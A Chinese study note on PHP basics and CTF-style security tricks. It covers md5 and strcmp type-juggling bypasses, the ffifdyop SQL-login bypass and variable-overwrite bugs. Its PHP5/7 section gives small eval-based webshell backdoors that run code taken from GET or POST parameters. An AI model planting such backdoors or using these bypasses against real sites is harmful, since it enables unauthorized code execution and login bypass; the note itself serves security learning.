# PHP知识小结



## 基础知识
### PHP标签
-   `<?php 标准风格标记，属于XML风格；?>`
-	`<script lanauage="php">长风格标记</script>`
-	`<? 短风格的标记 ?>`      需要在php.ini中short_open_tag设置
-	`<% ASP风格的标记 %>`     需要在php.ini中asp_tags设置
-   `<?=`       同等于<? echo，适用版本>PHP 5.4.0

PHP 中的每个代码行都必须以分号(`;`)结束 
错误运算符 `@`，当将其放在一个PHP表达式之前，该表达式可能产生的任何错误信息都被忽略掉

</br>

### 变量
```php
简单数据类型：
- Boolean 布尔型
- string 字符串型
- integer 整型
- float 浮点型

复合数据类型：
- array 数组
- object 对象

两种特殊类型
- resource 资源
- NULL
```

检测变量类型：
- `is_bool()` 是否为布尔型
- `is_int(),is_integer(),is_long()` 是否为整型
- `is_float(),is_double(),is_real()` 是否为浮点型
- `is_string()` 是否为字符串
- `is_array()` 是否为数组
- `is_object()` 是否为对象
- `is_resource()` 是否为资源类型
- `is_null()` 是否为空
- `is_scalar()` 是否是标量，也就是是否为整数、浮点数、布尔型或字符串。
- `is_numeric()` 是否是任何类型的数字或数字字符串
- `is_callable()` 判断是否是有效的函数名

<br/>

可变变量是一种PHP独特的变量，利用一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。
```php
<?php
$a='hello';
$$a='wrold';


以下均输出 world
echo $$a;
echo ${$a};
echo $hello;
?>
```

PHP中常用魔术常量：
- `__FILE__`    当前的文件名
- `__LINE__`   当前的行数
- `__FUNCTION__`   当前的函数名
- `__CLASS__`   当前的类名
- `__METHOD__`  当前对象的方法名

<br/>

变量作用域：
- 局部变量：在 PHP 函数内部声明的变量是局部变量，仅能在函数内部访问
- 全局变量：在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。
- 静态变量：使用`static`关键字声明变量，能够在函数调用结束后仍保留变量值，当再次回到其作用域时，又可以继续使用原来的值

<br/>

常量使用`define`函数来定义，不能通过赋值，例如`<?php define('pi','3.14');echo pi?>`，常量一旦定义就不能被重新定义或者取消定义，直到脚本运行结束自动释放，且不受变量范围影响，在任何地方都可以定义和访问

<br/>

### 超全局变量 
超全局变量在 PHP 4.1.0 中引入，是在全部作用域中始终可用的内置变量。

```php
$GLOBALS  引用全局作用域中可用的全部变量
$_POST  获取POST数据
$_GET  获取GET数据
$_COOKIE  获取COOKIE信息
$_SESSION  获取SESSION信息
$_FILES  获取上传的文件信息
$_REQUEST  用于收集 HTML 表单提交的数据
$_ENV  环境变量
$_SERVER  服务器和执行环境信息
```
<br/>

### 输出语句
- `echo` 最常见的PHP输出语句，例如：`<?php echo "hello"; ?>`
- `print()`存在返回值，输出成功返回1，失败返回0，例如：`<?php print("hello")?>`
- `printf` 格式化输出字符串，例如：`<?php printf("%d,%.2f",1,1.2); ?>`
- `print_r()` 打印字符，字符串，数字，数组，对象等复合的数据类型，例如：`<?php print_r('hello'); ?>`
- `var_dump()` 在print_r基础上加上数据的类型和长度，例如：`<?php var_dump('hello'); ?>`

<br/>

双引号可以解析变量，单引号不能解析变量，字符串之间用`.`来连接
```php
<?php
$a="hello";
$b="world";

echo "$a"."$b"; 输出helloworld
echo '$a'.'$b'; 输出$a$b
?>
```

<br/>

### 数组
创建数组
```php
<?php
$arr=array(
    'username'=>'root',
    'password'=>'root123'
);


$arr['username']='root';
$arr['password']='root123';
?>
```
遍历数组
```php

<?php
//遍历数值数组
$fruits=array("apple","banana","peach");
$arrlength=count($fruits);

for($x=0;$x<$arrlength;$x++)
{
    echo $fruits[$x];
    echo "<br>";
}
?>


<?php
//遍历关联数组
$age=array("zs"=>"12","ls"=>"15","ww"=>"18");
foreach($age as $x=>$x_value)
{
    echo "Key=" . $x . ", Value=" . $x_value;
    echo "<br>";
}
?>
```
数组排序
- `sort()`  对数组进行升序排列
- `rsort()` 对数组进行降序排列
- `asort()` 根据关联数组的值，对数组进行升序排列
- `ksort()` 根据关联数组的键，对数组进行升序排列
- `arsort()`根据关联数组的值，对数组进行降序排列
- `krsort()`根据关联数组的键，对数组进行降序排列

<br/>

### 文件操作
`fopen($fname, mode)`函数用于在 PHP 中打开文件，第一个参数含有要打开的文件的名称，第二个参数规定了使用哪种模式来打开文件。
- `r` 只读。在文件的开头开始。
- `r+` 读/写。在文件的开头开始。
- `w` 只写。打开并清空文件的内容；如果文件不存在，则创建新文件。
- `w+` 读/写。打开并清空文件的内容；如果文件不存在，则创建新文件。
- `a` 追加。打开并向文件末尾进行写操作，如果文件不存在，则创建新文件。
- `a+` 读/追加。通过向文件末尾写内容，来保持文件内容。
- `x` 只写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。
- `x+` 读/写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。

注释：如果 fopen() 函数无法打开指定文件，则返回 0 (false)。

读取文件
```php
<?php
//读取文件每一行
$file = fopen("flag.txt", "r") or exit("无法打开文件!");
while(!feof($file))
{
    echo fgets($file). "<br>";
}
fclose($file);
?> 


<?php
//逐字符地读取文件
$file=fopen("flag.txt","r") or exit("无法打开文件!");
while (!feof($file))
{
    echo fgetc($file);
}
fclose($file);
?> 
```

获取文件目录
```php
<?php
$a=scandir("./");
print_r($a);
?>
```
获取文件内容
```php
<?php
show_source('flag.txt');
highlight_file('flag.txt');
var_dump(file('flag.txt'));
print_r(file('flag.txt'));
file_get_contents('flag.txt'); //需要echo打印出来
?>
```

<br/>

## 常见函数
### strcmp 和 strcasecmp
strcmp 和 strcasecmp（不区分大小写） 用于比较字符串，返回值如下：
- 如果 str1 小于 str2 返回 < 0；
- 如果 str1 大于 str2 返回 > 0；
- 如果两者相等，返回 0。

5.2 中是将两个参数先转换成string类型。
5.3.3 以后，当比较数组和字符串的时候，返回是0。
5.5 中如果参数不是string类型，直接return了
```php
<?php
$array=[];
//数组跟字符串比较会返回0,也就是判断为相等,输出null
var_dump(strcmp($array, 'abc')); 
var_dump(strcasecmp($array, 'abc'));
?>
```

### md5
md5(string, raw) raw为可选，规定十六进制或二进制输出格式
- TRUE - 原始 16 字节格式
- FALSE - 默认，32 字符十六进制数

md5函数不能处理数组，如果传入数组会返回null，所以两个数组经过md5处理后的结果均相等，都为null
```php
<?php
// ?a[]=1&b[]=2
if($_GET['a']!==$_GET['b'] && md5($_GET['a'])===md5($_GET['b'])){
        die("success!");
    }
?>
```
md5函数弱类型比较，当用0e开头的字符会表示成科学计数法，0的多少次方结果均为0，从而让绕过md5函数弱比较
开头为0e的值：
- `QNKCDZO`  对应md5值 0e830400451993494058024219903391
- `s878926199a` 对应md5值 0e545993274517709034328855841020
- `s1091221200a` 对应md5值：0e940624217856561557816327384675

```php
<?php
//?a=QNKCDZO&b=s878926199a
//?a[]=1&b[]=2
if($_GET['a']!=$_GET['b'] && md5($_GET['a'])==md5($_GET['b'])){
        die("success!");
    }
?>
```
ffifdyop绕过
当源码sql语句为`$sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";`，可以用ffifdyop绕过
原理：
ffifdyop字符串经过md5加密后再转成字符为 `'or'66�]��!r,��b`，带入sql语句变成
`select * from admin where password=''or'<乱码>' ` 相当于`select * from admin where password=''or 1 `

### intval
intval()转换的时候，会将从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，intval()不会报错而是返回0。
```php
var_dump(intval('2')) // 2
var_dump(intval('3abcd')) // 3
var_dump(intval('abcd')) // 0

var_dump(0 == '0'); // true
var_dump(0 == 'abcdefg'); // true 
var_dump(0 === 'abcdefg'); // false
var_dump(1 == '1abcdef'); // true
```

### is_numeric
is_numeric函数判断变量是否为数字或数字字符串，不仅检查十进制，十六进制是可以
```php
<?php
echo is_numeric(233333);       // 1
echo is_numeric('233333');    // 1
echo is_numeric(0x233333);    // 1
echo is_numeric('0x233333');    // 1
echo is_numeric('9e9');   // 1
echo is_numeric('233333abc');  // 0
?>
```

### in_array
在所有php认为是int的地方输入string，都会被强制转换
```php
<?php
$array=[0,1,2,'3'];  
var_dump(in_array('abc', $array)); //true   abc被转化成0
var_dump(in_array('1bc', $array)); //true   1bc被转化成1
?>
```
<br/>

### 变量覆盖
将我们自定义的参数值替换原来程序的参数值的情况称作为变量覆盖，变量覆盖主要是函数使用不当如`extract`、`parse_str`、`import_request_variables`或者开启了全局变量注册、`$$`等。
#### extract
PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。
```php
<?php 
//?auth=1
    $auth = '0';  //这里可以覆盖$auth的变量值
    extract($_GET); 
    if($auth == 1){  
        echo "private!";  
    } else{  
        echo "public!";  
    }  
?>
```

#### parse_str
parse_str的作用是解析字符串并注册成变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域
```php
<?php
//?auth=1
$auth=false;
parse_str($_SERVER['QUERY_STRING']);  
if ($auth) {
	echo "true";
}
?>
```
#### import_request_variables
import_request_variables 函数可以在register_global =off时，把GET/POST/Cookie变量导入全局作用域中。
注意：该函数从PHP5.4起已经被移除。
```php
<?php
//?auth=1
$auth = '0';  
import_request_variables('G'); //参数G 表示指定导入GET请求中的变量，从而导致变量覆盖。
if($auth == 1){  
    echo "private!";  
}else{  
    echo "public!";  
}  
?>
```
#### $$变量覆盖
`$$`变量覆盖，利用foreach初始化遍历变量，将获取到的数组键名作为变量，数组中的键值作为变量的值，可能会导致变量覆盖
```php
<?php 
//?auth=1
 $auth='0';
 
foreach($_GET as $key => $value) {
	echo 'key= '.$key." ".'value= '.$value;
	$$key = $value;
 }
  
if ($auth) {
	echo "<br/>"."true";
}
?>
```
#### 全局变量覆盖
在PHP版本小于5.4且PHP配置register_globals=ON时。可能会出现该漏洞，如果前面已经给$auth赋值则无法触发该漏洞
```php
<?php
//?auth=1
echo "Register_globals: ".(int)ini_get("register_globals")."<br/>";

if ($auth){
   echo "private!";
}
?>
```

<br/>

## 版本区别
PHP5和PHP7的安全方面上的区别，大部分内容为[转载](https://www.cnblogs.com/r00tuser/p/10528864.html)

#### preg_replace()不再支持/e修饰符
在PHP5，该函数/e修饰符可以导致代码执行
```php
<?php
preg_replace("/.*/e",$_GET["h"],"."); 
?>
```
虽然现在PHP7以上不再支持/e修饰符，但是官方给了一个新的函数preg_replace_callback，稍微修一下就可以利用它做后门
```php
<?php
preg_replace_callback("/.*/",function ($a){@eval($a[0]);},$_GET["h"]);
?>
```

#### create_function被废弃
create_function函数可以导致代码执行，虽说被弃用了，但是仍然可以用
```php
<?php
$func =create_function('',$_POST['cmd']);$func();
?>
```

#### mysql_*系列全员移除
如果要在PHP7上面用老版本的mysql_*系列函数就需要你自己去额外装了，官方不在自带，现在官方推荐的是mysqli或者pdo_mysql。这是否预示着未来SQL注入漏洞在PHP上的大幅减少呢~

#### assert()默认不在可以执行代码
这意味着大部分的后门都不可以使用，同时菜刀的文件管理器也是使用assert，导致菜刀没办法在PHP7上正常使用

#### 十六进制字符串不再被认为是数字
```php
<?php
//PHP7
var_dump("0x123" == "291"); //bool(false) 
var_dump(is_numeric("0x123"));//bool(false) 
var_dump("0xe" + "0x1"); // int(0) 
var_dump(substr("foo", "0x1"));// string(3) "foo" 
?>
```
#### 移除了 ASP 和 script PHP 标签
`<% %>`、`<%= %>`、`<script language="php"> </script>`被移除，现在PHP7只有`<?php ?>`和`<?= ?>`标签可以使用

#### 超大浮点数类型转换截断
将浮点数转换为整数的时候，如果浮点数值太大，导致无法以整数表达的情况下， 在PHP5的版本中，转换会直接将整数截断，并不会引发错误。 在PHP7中，会报错。



<br/>

## 参考
[ CTF 中的 PHP 知识汇总 ](https://www.restran.net/2016/09/26/php-security-notes/)
[PHP7和PHP5在安全上的区别[更新]](https://www.cnblogs.com/r00tuser/p/10528864.html)

